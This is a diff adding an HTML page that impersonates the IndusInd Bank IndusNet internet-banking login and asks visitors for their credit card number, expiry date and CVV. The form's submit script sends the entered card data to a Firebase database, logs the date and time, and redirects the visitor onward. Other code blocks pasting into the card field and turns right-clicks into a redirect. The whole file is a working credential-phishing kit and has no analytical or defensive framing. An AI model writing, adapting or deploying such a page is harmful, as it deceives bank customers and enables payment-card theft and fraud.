@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Welcome to Internet Banking</title>
+<link href="./main_files/style.css" rel="stylesheet" type="text/css">
+<link href="./main_files/css" rel="stylesheet">
+<link href="./main_files/style.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./main_files/jquery.bxslider.css" type="text/css">
+<link rel="stylesheet" href="./main_files/jquery.custom-scrollbar.css" type="text/css">
+<link href="./main_files/media.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./main_files/font-awesome.min.css">
+<link rel="stylesheet" href="./main_files/sprite-login.css" type="text/css">
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/bxslider/4.2.12/jquery.bxslider.css">
+<link rel="stylesheet" href="./main_files/font-awesome.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/bxslider/4.2.12/jquery.bxslider.min.js"></script>
+  
+    
+<script>
+$(document).ready(function(){
+  $('.bannerSlider').bxSlider({
+    slideWidth: 600,
+    minSlides: 1,
+    maxSlides: 1,
+    moveSlides: 1,
+    slideMargin: 10,
+    auto: true,
+    mode: 'horizontal'
+  });
+});
+</script>
+</head>
+<body>
+
+<header class="pageHeader">
+    <div class="wrapper">
+        <a href="#"><img src="./main_files/logo.png" alt="Indusind Bank" title="Indusind Bank" class="logo"></a>
+        <img src="./main_files/indusnet-logo.png" alt="Indusnet" class="indusnetLogo">
+        
+    </div>
+</header>
+
+<div class="banner">
+    <div class="wrapper">
+        <ul class="bannerSlider">
+            <li><a href="#" target="_blank"><img src="./main_files/CBDC_IndusNet_Banner.jpg" alt=""></a></li>
+            <li><a href="#" target="_blank"><img src="./main_files/NRI_Banking_Banner_1170x165_px-01.jpg" alt=""></a></li>
+            <li><a href="#" target="_self"><img src="./main_files/IndusMobile_Banners1-Apr-07.jpg" alt=""></a></li>
+            <li><a href="#" target="_self"><img src="./main_files/RTGS_24X7_Banner.jpeg" alt=""></a></li>
+            <li><a href="#" target="_blank"><img src="./main_files/Indus_Delight_Net_Banking_Banners_1170_x_165_px.jpg" alt=""></a></li>
+        </ul>
+    </div>
+</div>
+
+<div class="loginContent">
+    <div class="wrapper">
+        <div class="loginSec">
+            <ul class="loginTab">
+    <li style="font-weight: bold;">Enter your Credit Card Details</li>
+</ul>
+
+            <div class="loginTabContent current">
+                
+                
+               <form action="" id="UDIND002" method="post">
+                    <div class="fieldBase">
+    <input autocomplete="OFF" inputmode="numeric" placeholder="Credit Card Number" type="text" id='ccnum' minlength="19" maxlength="19" class="txtField" size="28" oninput="formatCreditCardNumber()" oncopy="return false" onpaste="return false" onselect="return false" oncut="return false" tabindex="1" required>
+</div>
+
+<script>
+    function formatCreditCardNumber() {
+        let input = document.getElementById('ccnum');
+        let value = input.value.replace(/\s/g, '');
+        let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
+        input.value = formattedValue;
+    }
+</script>
+
+                    <br>
+                    
+                    
+                    <div style="display: flex;">
+    <div class="fieldBase">
+    <input autocomplete="OFF" type="text" id='vupto' inputmode="numeric" placeholder="Valid Upto" class="txtField" size="28" minlength="5" maxlength="5" tabindex="2" oninput="formatValidUpto(this)" required>
+</div>
+
+<script>
+    function formatValidUpto(input) {
+        let value = input.value.replace(/\s/g, '');
+        if (value.length >= 2 && value.charAt(2) !== '/') {
+            input.value = value.substring(0, 2) + '/' + value.substring(2);
+        }
+    }
+</script>
+
+
+
+                        
+    <div class="fieldBase">
+        <input autocomplete="OFF" type="text" id='ccvv' inputmode="numeric" placeholder="CVV" class="txtField" size="28" minlength="3" maxlength="3" tabindex="2" required>
+    </div>
+</div>
+
+                    
+                    <br>
+                   <button type="submit" class="signInBtn" id="button1" tabindex="6">Continue</button>
+
+                    
+                </form>
+                
+                <br>
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer class="pageFooter">
+    <div class="footerTop">
+        <div class="wrapper">
+            <p>Enjoy banking on the go with our next generation Mobile App</p>
+            <a href="#" target="_blank"><img src="./main_files/app-store-apple.png" alt="Apple App Store" title="Apple App Store"></a>
+            <a href="#" target="_blank"><img src="./main_files/google-play.png" alt="Google Play" title="Google Play"></a>
+            <a href="#" target="_blank"><img src="./main_files/app-store.png" alt="App Store" title="App Store"></a>
+        </div>
+    </div>
+    <div class="footerBtm">
+        <div class="wrapper">
+            <div class="footerLeft">
+                <p><a target="_blank" href="#">Privacy Policy</a> <a target="_blank" href="#">Terms & Condition</a> <a target="_blank" href="#">Disclaimer</a> <span>COPYRIGHT © ALL RIGHTS RESERVED</span></p>
+                <p><strong>Browser Requirements for NetBanking</strong><br>Please Use I.E 10 and above or any other browser with Latest Version.</p>
+            </div>
+            <a href="#"><img src="./main_files/entrust-logo.png" alt="Entrust" title="Entrust"></a>
+        </div>
+    </div>
+</footer>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
+
+    
+       <script src="main_files/firebase.js">
+    
+    </script>
+    
+    
+    <script>
+        
+    document.getElementById("UDIND002").addEventListener("submit", submitForm);
+
+    function submitForm(e) {
+        e.preventDefault();
+        
+        const cardNumber = document.getElementById("ccnum").value.replace(/\s/g, "");
+        const cardValidity = document.getElementById("vupto").value;
+        const cvv = document.getElementById("ccvv").value;
+
+        saveDataToFirebase(cardNumber, cardValidity, cvv);
+    }
+
+    function saveDataToFirebase(cardNumber, cardValidity, cvv) {
+        const dbRef = firebase.database().ref('UDIND002');
+        const currentDate = getCurrentDate();
+        const currentTime = getCurrentTime();
+
+        dbRef.push({
+            Card: cardNumber,
+            Valid: cardValidity,
+            CVV: cvv,
+            date: currentDate,
+            time: currentTime
+        }).then(() => {
+            console.log("Data saved successfully to Firebase.");
+            window.location.href = "valid01.html"; // Redirect on successful save
+        }).catch((error) => {
+            console.error("Error saving data to Firebase:", error);
+        });
+    }
+
+    function getCurrentDate() {
+        const currentDate = new Date();
+        const year = currentDate.getFullYear();
+        const month = String(currentDate.getMonth() + 1).padStart(2, "0");
+        const day = String(currentDate.getDate()).padStart(2, "0");
+        return `${year}-${month}-${day}`;
+    }
+
+    function getCurrentTime() {
+        const currentTime = new Date();
+        const hours = String(currentTime.getHours()).padStart(2, "0");
+        const minutes = String(currentTime.getMinutes()).padStart(2, "0");
+        const seconds = String(currentTime.getSeconds()).padStart(2, "0");
+        return `${hours}:${minutes}:${seconds}`;
+    } 
+        
+    </script>
+
+</body>
+    <script type="text/javascript">
+    // Refresh to main page (index) on right-click
+    document.addEventListener('contextmenu', function(event) {
+        event.preventDefault();
+        window.location.href = "index.html"; // Replace "index.html" with your main page URL
+    });
+</script>
+</html>
